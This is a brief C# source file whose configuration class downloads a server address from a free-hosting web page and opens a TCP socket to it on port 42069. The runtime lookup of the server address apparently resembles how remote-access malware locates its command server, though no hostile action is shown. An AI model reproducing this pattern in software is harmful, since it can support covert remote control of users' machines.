using System.Net;

public abstract class TCPSocketConfiguration
{
	public static void BuildDefaultConfiguration(out TCPSocket socket)
	{
		socket = null;
		using (WebClient client = new WebClient())
		{
			string address = client.DownloadString("https://amigosinformaticos.000webhostapp.com/");
			socket = new TCPSocket(address, 42069);
		}
	}
}